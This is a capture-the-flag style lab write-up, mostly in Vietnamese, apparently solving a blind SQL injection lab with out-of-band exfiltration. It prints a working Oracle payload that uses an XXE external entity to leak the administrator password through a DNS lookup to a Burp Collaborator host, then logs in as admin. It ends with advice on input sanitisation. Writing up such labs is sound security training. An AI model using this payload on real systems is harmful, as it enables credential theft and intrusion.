>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
>
>The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
>To solve the lab, log in as the `administrator` user.

Ở bài này yêu cầu cần phải làm của chúng ta đó là làm sao để có thể khai thác việc server rẽ hướng sang một ví trí khác để truy vấn và lấy DNS thì ta có thể dụ nó để có thể lấy được password để đăng nhập vào tài khoản administrator. Đầu tiên ta cần phải viết 1 câu lệnh truy vấn SQL trước để lấy được password ta sẽ sử dụng:

`SELECT password FROM users WHERE username = 'administrator'`

Từ đây ta có thể thử xem server sử dụng DBMS gì bằng các phép thử với trường hợp DNS lookup của nó và ta đã xác định được server sử dụng Oracle thông qua câu lệnh tận dụng XXE để khai thác như sau:

`|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.9z922t8rg2h5vmhjvdjb5ekp1g78vyjn.oastify.com/"> %remote;]>'),'/l') FROM dual)-- -`

Ở đây khi nó DNS lookup vào url của chúng ta thì nó sẽ gắn thêm password của tài khoản administrator ở trước đường dẫn domain của chúng ta. Từ đây ta có thể gửi lên server như sau.

![](images/Pasted%20image%2020261122163842.png)

Và sau khi gửi thì ta đã nhận được các lượt DNS lookup về với đường dẫn qua việc theo dõi bằng Burp Collaborator như sau:

![](images/Pasted%20image%2020261122164325.png)

Ở đây ta đã xác định được mật khẩu của admin là phần được gắn ở phía trước domain collab của ta tạo từ đây sử dụng nó để đăng nhập vào tài khoản admin.

![](images/Pasted%20image%2020261122164443.png)

Vậy là ta đã có thể đăng nhập vào được tài khoản admin. Một điều vô cùng quan trọng đó là cần phải xử lí kĩ thông tin đầu vào của các câu lệnh truy vấn database để tránh việc để server có thể đọc và hiểu đó là một câu lệnh hệ thống dẫn đến việc khai thác SQL Injection thông qua việc gửi tài khoản của admin và để lộ thông tin cá nhân qua việc truy vấn. Nguy hiểm hơn còn có thể là lộ toàn bộ thông tin tài khoản người dùng chứ không chỉ 1 tài khoản riêng lẻ. Dẫn đến việc những người sử dụng 1 mật khẩu cho nhiều tài khoản khác nhau sẽ bị mất tất cả đảm bảo được tính bền vững và tồn tại lâu dài của hacker trong hệ thống của một cá nhân.
